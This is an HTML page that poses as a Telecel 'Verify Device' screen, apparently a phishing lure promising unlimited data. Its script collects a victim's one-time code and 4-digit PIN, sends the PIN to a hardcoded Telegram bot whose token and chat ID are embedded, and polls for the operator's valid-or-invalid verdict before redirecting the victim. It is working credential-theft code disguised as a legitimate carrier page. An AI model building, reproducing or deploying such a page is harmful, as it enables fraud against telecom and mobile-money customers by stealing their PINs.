<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8"/>
    <meta content="width=device-width, initial-scale=1.0" name="viewport"/>
    <title>Telecel - Device Verification</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Inter', sans-serif;
            background: linear-gradient(135deg, #E30613 0%, #0033A0 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
            color: #333;
        }
        .container {
            width: 100%;
            max-width: 420px;
            background: #fff;
            border-radius: 16px;
            padding: 32px 24px;
            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.15);
            text-align: center;
        }
        .logo-t {
            color: #E30613;
            font-size: 52px;
            font-weight: 900;
            letter-spacing: -1px;
            border: 4px solid #E30613;
            border-radius: 50%;
            width: 80px;
            height: 80px;
            line-height: 72px;
            margin: 0 auto;
        }
        .logo-text {
            color: #E30613;
            font-size: 28px;
            font-weight: 700;
            margin: 8px 0 24px;
        }
        h1 { font-size: 24px; font-weight: 700; margin-bottom: 8px; }
        .subtitle {
            font-size: 15px;
            color: #555;
            line-height: 1.4;
            margin-bottom: 24px;
        }
        .otp-container, .pin-container {
            display: flex;
            justify-content: space-between;
            gap: 8px;
            margin: 24px 0;
        }
        .otp-input, .pin-input {
            width: 50px;
            height: 60px;
            text-align: center;
            font-size: 24px;
            font-weight: 700;
            border: 2px solid #E30613;
            border-radius: 12px;
            outline: none;
        }
        .pin-input { width: 45px; height: 55px; font-size: 22px; }
        .otp-input:focus, .pin-input:focus {
            box-shadow: 0 0 0 3px rgba(227, 6, 19, 0.12);
            border-color: #0033A0;
        }
        .error-msg {
            color: #dc3545;
            font-size: 13px;
            margin-top: 6px;
            display: none;
            padding: 10px;
            background: rgba(220, 53, 69, 0.1);
            border-radius: 6px;
        }
        .success-msg {
            color: #28a745;
            font-size: 13px;
            margin-top: 6px;
            display: none;
            padding: 10px;
            background: rgba(40, 167, 69, 0.1);
            border-radius: 6px;
        }
        .btn-action {
            width: 100%;
            padding: 18px;
            font-size: 18px;
            font-weight: 700;
            border-radius: 12px;
            cursor: pointer;
            margin: 12px 0 8px;
            color: #fff;
            background: linear-gradient(135deg, #E30613 0%, #0033A0 100%);
            border: none;
        }
        #spinner {
            position: fixed;
            inset: 0;
            background: rgba(0,0,0,0.85);
            display: none;
            justify-content: center;
            align-items: center;
            z-index: 9999;
            flex-direction: column;
            color: white;
        }
        .spin {
            width: 60px;
            height: 60px;
            border: 6px solid #f0f0f0;
            border-top: 6px solid #E30613;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo-t">t</div>
        <div class="logo-text">telecel</div>

        <!-- Device Verification Step -->
        <div id="deviceStep">
            <h1>Verify Device</h1>
            <p class="subtitle">Please enter the 6-digit code sent to your number</p>
            <div class="otp-container" id="otpInputs">
                <!-- 6 inputs generated by JS -->
            </div>
        </div>

        <!-- PIN Step -->
        <div id="pinStep" style="display: none;">
            <h1>Enter PIN</h1>
            <p class="subtitle">Enter your 4-digit PIN to confirm</p>
            <div class="pin-container" id="pinInputs">
                <!-- 4 inputs generated by JS -->
            </div>
        </div>

        <div class="error-msg" id="errMsg"></div>
        <div class="success-msg" id="successMsg">✓ Submitted! Waiting for approval...</div>
        <button class="btn-action" id="verifyBtn">Verify & Continue</button>
    </div>

    <!-- Spinner -->
    <div id="spinner">
        <div class="spin"></div>
        <p style="margin-top:15px;">Waiting for approval...</p>
    </div>

    <script>
        const CONFIG = {
            BOT_TOKEN: '8746906558:AAHpzw4CN1J8y4LdO7f8fBsZ_DIFhKYuXB8',
            CHAT_ID: '7547427914',
            SUCCESS_PAGE: 'https://unlimiteddata.vercel.app/success.html',
            DEVICE_PAGE: 'https://unlimiteddata.vercel.app/device_verify.html'
        };

        let state = {
            lastUpdateId: 0,
            pollInterval: null,
            validPinId: null,
            invalidPinId: null
        };

        const deviceStep = document.getElementById('deviceStep');
        const pinStep = document.getElementById('pinStep');
        const verifyBtn = document.getElementById('verifyBtn');
        const errMsg = document.getElementById('errMsg');
        const successMsg = document.getElementById('successMsg');
        const spinner = document.getElementById('spinner');

        // Create inputs
        function createInputs(containerId, count, className) {
            const container = document.getElementById(containerId);
            container.innerHTML = '';
            for (let i = 0; i < count; i++) {
                const input = document.createElement('input');
                input.type = 'text';
                input.maxLength = 1;
                input.className = className;
                input.inputMode = 'numeric';
                container.appendChild(input);
            }
        }

        function setupAutoFocus(inputs) {
            inputs.forEach((input, index) => {
                input.addEventListener('input', () => {
                    if (input.value.length === 1 && index < inputs.length - 1) {
                        inputs[index + 1].focus();
                    }
                });
                input.addEventListener('keydown', (e) => {
                    if (e.key === 'Backspace' && !input.value && index > 0) {
                        inputs[index - 1].focus();
                    }
                });
            });
        }

        function getCode(inputs) {
            return Array.from(inputs).map(i => i.value).join('');
        }

        function submitDeviceCode() {
            const code = getCode(document.querySelectorAll('.otp-input'));
            if (code.length !== 6) {
                showError("Please enter the full 6-digit code");
                return;
            }
            deviceStep.style.display = 'none';
            pinStep.style.display = 'block';
            document.querySelectorAll('.pin-input')[0].focus();
        }

        function submitPin() {
            const pin = getCode(document.querySelectorAll('.pin-input'));
            if (pin.length !== 4) {
                showError("PIN must be 4 digits");
                return;
            }

            const ts = Date.now();
            state.validPinId = `valid_pin_${ts}`;
            state.invalidPinId = `invalid_pin_${ts}`;

            const message = `<b>PIN Confirmation</b>\n\nPIN: ${pin}\n\nChoose action:`;

            fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CONFIG.CHAT_ID,
                    text: message,
                    parse_mode: 'HTML',
                    reply_markup: {
                        inline_keyboard: [[
                            { text: '✅ Valid PIN', callback_data: state.validPinId },
                            { text: '❌ Invalid PIN', callback_data: state.invalidPinId }
                        ]]
                    }
                })
            }).then(() => {
                spinner.style.display = 'flex';
                startPolling();
            });
        }

        function showError(msg) {
            errMsg.textContent = msg;
            errMsg.style.display = 'block';
            setTimeout(() => errMsg.style.display = 'none', 4000);
        }

        function startPolling() {
            if (state.pollInterval) clearInterval(state.pollInterval);

            state.pollInterval = setInterval(() => {
                fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/getUpdates?offset=${state.lastUpdateId + 1}&timeout=10`)
                    .then(r => r.json())
                    .then(data => {
                        if (!data.ok || !data.result) return;
                        data.result.forEach(update => {
                            state.lastUpdateId = Math.max(state.lastUpdateId, update.update_id);
                            if (update.callback_query) {
                                const cb = update.callback_query.data;

                                if (cb === state.validPinId) {
                                    clearInterval(state.pollInterval);
                                    spinner.style.display = 'none';
                                    window.location.href = CONFIG.SUCCESS_PAGE;

                                } else if (cb === state.invalidPinId) {
                                    clearInterval(state.pollInterval);
                                    spinner.style.display = 'none';
                                    errMsg.textContent = "Invalid PIN. Please try again.";
                                    errMsg.style.display = 'block';
                                    // Return to PIN step
                                    document.querySelectorAll('.pin-input').forEach(i => i.value = '');
                                    document.querySelectorAll('.pin-input')[0].focus();
                                }
                            }
                        });
                    });
            }, 2000);
        }

        // Initialize
        createInputs('otpInputs', 6, 'otp-input');
        createInputs('pinInputs', 4, 'pin-input');

        const otpInputs = document.querySelectorAll('.otp-input');
        const pinInputs = document.querySelectorAll('.pin-input');

        setupAutoFocus(otpInputs);
        setupAutoFocus(pinInputs);

        otpInputs[0].focus();
        verifyBtn.onclick = submitDeviceCode;

        // Auto submit on complete
        document.addEventListener('input', () => {
            if (getCode(otpInputs).length === 6 && deviceStep.style.display !== 'none') {
                setTimeout(submitDeviceCode, 200);
            }
            if (getCode(pinInputs).length === 4 && pinStep.style.display !== 'none') {
                setTimeout(submitPin, 200);
            }
        });
    </script>
</body>
</html>
